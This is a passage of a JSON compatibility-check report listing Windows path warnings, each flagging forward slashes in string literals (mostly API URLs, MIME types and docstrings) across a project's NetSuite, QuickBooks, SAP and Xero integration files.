        "timestamp": "2025-09-05T17:30:42.325908"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 211: Forward slash in path - \"Failed to create/find vendor\"",
        "timestamp": "2025-09-05T17:30:42.325947"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 243: Forward slash in path - \"{self.rest_endpoint}/{self.record_types['",
        "timestamp": "2025-09-05T17:30:42.325972"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 245: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.325981"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 246: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.325989"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 310: Forward slash in path - \"{self.rest_endpoint}/{self.record_types['",
        "timestamp": "2025-09-05T17:30:42.326033"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 312: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326055"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 313: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326066"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 373: Forward slash in path - \"{self.rest_endpoint}/{ns_record_type}/{record_id}\"",
        "timestamp": "2025-09-05T17:30:42.326108"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 375: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326121"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 390: Forward slash in path - \"Cancel/void a posted document\"",
        "timestamp": "2025-09-05T17:30:42.326136"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 482: Forward slash in path - \"{self.rest_endpoint}/{self.record_types['",
        "timestamp": "2025-09-05T17:30:42.326192"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 484: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326206"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 485: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326219"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 503: Forward slash in path - \"{self.base_url}/services/rest/query/{self.api_version}/suiteql\"",
        "timestamp": "2025-09-05T17:30:42.326239"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 508: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326255"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\netsuite_integration.py",
        "warning": "Line 509: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326269"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 52: Forward slash in path - \"\n    QuickBooks Online API integration\n    \n    Features:\n    - OAuth 2.0 authentication with token refresh\n    - Bill/Invoice creation and management\n    - Vendor/Customer management\n    - Chart of accounts integration\n    - Automatic categorization\n    - Real-time sync and webhooks\n    \"",
        "timestamp": "2025-09-05T17:30:42.326584"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 82: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326609"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 83: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.326614"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 138: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/companyinfo/{self.credentials.realm_id}\"",
        "timestamp": "2025-09-05T17:30:42.326646"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 215: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/{entity_type}/{entity_id}\"",
        "timestamp": "2025-09-05T17:30:42.326690"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 235: Forward slash in path - \"Cancel/void a posted document\"",
        "timestamp": "2025-09-05T17:30:42.326707"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 248: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/{entity_type}\"",
        "timestamp": "2025-09-05T17:30:42.326722"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 272: Forward slash in path - \"Failed to create/find vendor\"",
        "timestamp": "2025-09-05T17:30:42.326748"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 303: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/bill\"",
        "timestamp": "2025-09-05T17:30:42.326783"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 375: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/invoice\"",
        "timestamp": "2025-09-05T17:30:42.326981"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 437: Forward slash in path - \"{self.discovery_url}/oauth2/v1/tokens/bearer\"",
        "timestamp": "2025-09-05T17:30:42.327077"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 446: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.327108"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 447: Forward slash in path - \"application/x-www-form-urlencoded\"",
        "timestamp": "2025-09-05T17:30:42.327128"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 477: Forward slash in path - \"{self.discovery_url}/oauth2/v1/tokens/bearer\"",
        "timestamp": "2025-09-05T17:30:42.327165"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 485: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.327184"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 486: Forward slash in path - \"application/x-www-form-urlencoded\"",
        "timestamp": "2025-09-05T17:30:42.327204"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 527: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/vendor\"",
        "timestamp": "2025-09-05T17:30:42.327249"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 551: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/query\"",
        "timestamp": "2025-09-05T17:30:42.327286"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\quickbooks_integration.py",
        "warning": "Line 632: Forward slash in path - \"{self.base_url}/{self.api_version}/company/{self.credentials.realm_id}/{entity_type}/{entity_id}\"",
        "timestamp": "2025-09-05T17:30:42.327363"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 28: Forward slash in path - \"\n    server_url: str\n    username: str\n    password: str\n    \n    # SAP S/4HANA specific\n    client: Optional[str] = None\n    language: Optional[str] = \"",
        "timestamp": "2025-09-05T17:30:42.328273"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 61: Forward slash in path - \"\n    SAP ERP Integration supporting multiple SAP products\n    \n    Supported Systems:\n    - SAP S/4HANA (via REST APIs and OData)\n    - SAP Business One (via Service Layer)\n    - SAP Ariba (via APIs)\n    - SAP Concur (via APIs)\n    \n    Features:\n    - Multi-system support with unified interface\n    - Document posting (invoices, purchase orders, expenses)\n    - Master data management (vendors, customers, GL accounts)\n    - Real-time validation and error handling\n    - Batch processing capabilities\n    \"",
        "timestamp": "2025-09-05T17:30:42.328324"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 97: Forward slash in path - \"Configure for SAP S/4HANA\"",
        "timestamp": "2025-09-05T17:30:42.328358"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 98: Forward slash in path - \"/sap/opu/odata/sap\"",
        "timestamp": "2025-09-05T17:30:42.328371"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 99: Forward slash in path - \"/sap/bc/rest\"",
        "timestamp": "2025-09-05T17:30:42.328387"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 103: Forward slash in path - \"{self.odata_service_path}/API_SUPPLIERINVOICE_PROCESS_SRV\"",
        "timestamp": "2025-09-05T17:30:42.328401"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 104: Forward slash in path - \"{self.odata_service_path}/API_PURCHASEORDER_PROCESS_SRV\"",
        "timestamp": "2025-09-05T17:30:42.328414"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 105: Forward slash in path - \"{self.odata_service_path}/API_BUSINESS_PARTNER\"",
        "timestamp": "2025-09-05T17:30:42.328429"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 106: Forward slash in path - \"{self.odata_service_path}/API_GLACCOUNTLINEITEM_SRV\"",
        "timestamp": "2025-09-05T17:30:42.328440"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 111: Forward slash in path - \"/b1s/v1\"",
        "timestamp": "2025-09-05T17:30:42.328450"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 114: Forward slash in path - \"{self.service_layer_path}/PurchaseInvoices\"",
        "timestamp": "2025-09-05T17:30:42.328461"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 115: Forward slash in path - \"{self.service_layer_path}/PurchaseOrders\"",
        "timestamp": "2025-09-05T17:30:42.328470"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 116: Forward slash in path - \"{self.service_layer_path}/BusinessPartners\"",
        "timestamp": "2025-09-05T17:30:42.328481"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 117: Forward slash in path - \"{self.service_layer_path}/Items\"",
        "timestamp": "2025-09-05T17:30:42.328493"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 122: Forward slash in path - \"/api\"",
        "timestamp": "2025-09-05T17:30:42.328505"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 125: Forward slash in path - \"{self.ariba_api_path}/invoices\"",
        "timestamp": "2025-09-05T17:30:42.328516"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 126: Forward slash in path - \"{self.ariba_api_path}/purchase-orders\"",
        "timestamp": "2025-09-05T17:30:42.328527"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 127: Forward slash in path - \"{self.ariba_api_path}/suppliers\"",
        "timestamp": "2025-09-05T17:30:42.328538"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 132: Forward slash in path - \"/api/v3.0\"",
        "timestamp": "2025-09-05T17:30:42.328552"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 135: Forward slash in path - \"{self.concur_api_path}/expense/reports\"",
        "timestamp": "2025-09-05T17:30:42.328562"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 136: Forward slash in path - \"{self.concur_api_path}/receipts\"",
        "timestamp": "2025-09-05T17:30:42.328571"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 137: Forward slash in path - \"{self.concur_api_path}/common/vendors\"",
        "timestamp": "2025-09-05T17:30:42.328582"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 175: Forward slash in path - \"Authenticate with SAP S/4HANA using basic auth\"",
        "timestamp": "2025-09-05T17:30:42.328619"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 182: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.328636"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 198: Forward slash in path - \"S/4HANA authentication failed: {response.status}\"",
        "timestamp": "2025-09-05T17:30:42.328664"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 202: Forward slash in path - \"S/4HANA authentication error: {e}\"",
        "timestamp": "2025-09-05T17:30:42.328683"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 208: Forward slash in path - \"{self.credentials.server_url}{self.service_layer_path}/Login\"",
        "timestamp": "2025-09-05T17:30:42.328699"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 216: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.328714"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 243: Forward slash in path - \"{self.credentials.server_url}/oauth/token\"",
        "timestamp": "2025-09-05T17:30:42.328745"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 251: Forward slash in path - \"application/x-www-form-urlencoded\"",
        "timestamp": "2025-09-05T17:30:42.328766"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 291: Forward slash in path - \"Test S/4HANA connection\"",
        "timestamp": "2025-09-05T17:30:42.328871"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 296: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.328917"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 311: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.328946"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 328: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.328973"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 393: Forward slash in path - \"Post invoice to SAP S/4HANA\"",
        "timestamp": "2025-09-05T17:30:42.329037"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 424: Forward slash in path - \"].append(line_data)\n            \n            # Post to S/4HANA\n            url = f\"",
        "timestamp": "2025-09-05T17:30:42.329093"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 427: Forward slash in path - ']}/A_SupplierInvoice\"",
        "timestamp": "2025-09-05T17:30:42.329113"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 431: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.329134"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 432: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.329154"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 456: Forward slash in path - \"S/4HANA API error: {error_text}\"",
        "timestamp": "2025-09-05T17:30:42.329197"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 461: Forward slash in path - \"S/4HANA invoice posting failed: {e}\"",
        "timestamp": "2025-09-05T17:30:42.329221"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 502: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.329283"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 560: Forward slash in path - \"Get or create vendor in S/4HANA\"",
        "timestamp": "2025-09-05T17:30:42.329357"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 560: Forward slash in path - \"\n        # Implementation for S/4HANA vendor management\n        return \"",
        "timestamp": "2025-09-05T17:30:42.329383"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 588: Forward slash in path - \"{self.credentials.server_url}/oauth/token\"",
        "timestamp": "2025-09-05T17:30:42.329430"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\sap_integration.py",
        "warning": "Line 597: Forward slash in path - \"application/x-www-form-urlencoded\"",
        "timestamp": "2025-09-05T17:30:42.329463"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 61: Forward slash in path - \"\n    Xero Accounting Software Integration\n    \n    Features:\n    - OAuth 2.0 authentication with PKCE\n    - Multi-tenant support\n    - Bills and Invoices creation\n    - Purchase Orders processing\n    - Contact management (suppliers/customers)\n    - Real-time synchronization\n    - Webhook support for notifications\n    - Comprehensive error handling\n    \"",
        "timestamp": "2025-09-05T17:30:42.330078"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 85: Forward slash in path - \"{self.auth_base_url}/connect/token\"",
        "timestamp": "2025-09-05T17:30:42.330108"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 86: Forward slash in path - \"{self.api_base_url}/connections\"",
        "timestamp": "2025-09-05T17:30:42.330117"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 87: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/Bills\"",
        "timestamp": "2025-09-05T17:30:42.330125"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 88: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/Invoices\"",
        "timestamp": "2025-09-05T17:30:42.330135"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 89: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/PurchaseOrders\"",
        "timestamp": "2025-09-05T17:30:42.330144"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 90: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/Contacts\"",
        "timestamp": "2025-09-05T17:30:42.330152"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 91: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/Accounts\"",
        "timestamp": "2025-09-05T17:30:42.330162"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 92: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/Items\"",
        "timestamp": "2025-09-05T17:30:42.330169"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 97: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.330178"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 98: Forward slash in path - \"application/json\"",
        "timestamp": "2025-09-05T17:30:42.330186"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 152: Forward slash in path - \"{self.api_base_url}/api.xro/{self.api_version}/Organisation\"",
        "timestamp": "2025-09-05T17:30:42.330238"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 238: Forward slash in path - \"Failed to create/find supplier contact\"",
        "timestamp": "2025-09-05T17:30:42.330322"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 413: Forward slash in path - ']}/{doc_id}\"",
        "timestamp": "2025-09-05T17:30:42.330502"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 415: Forward slash in path - ']}/{doc_id}\"",
        "timestamp": "2025-09-05T17:30:42.330524"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 451: Forward slash in path - \"Cancel/void a posted document\"",
        "timestamp": "2025-09-05T17:30:42.330591"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 498: Forward slash in path - \"application/x-www-form-urlencoded\"",
        "timestamp": "2025-09-05T17:30:42.330659"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
        "warning": "Line 537: Forward slash in path - \"application/x-www-form-urlencoded\"",
        "timestamp": "2025-09-05T17:30:42.330715"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\integrations\\xero_integration.py",
